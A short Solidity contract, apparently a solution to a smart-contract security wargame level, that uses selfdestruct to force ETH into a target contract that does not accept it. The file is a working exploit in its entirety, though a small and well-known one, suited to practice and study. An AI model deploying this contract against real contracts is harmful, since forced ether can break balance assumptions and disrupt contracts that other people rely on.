// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import "./telephone.sol";

/**
 * This contract will self destruct in order to force the sending of ETH to the target contract
 */
contract forceAttack {

    address payable public target;
    constructor(address payable targetAddress) {
        target=targetAddress;
    }

// 
    function attack() external {
        selfdestruct(target);
    }

    // fallback function
    fallback() payable external{}
}
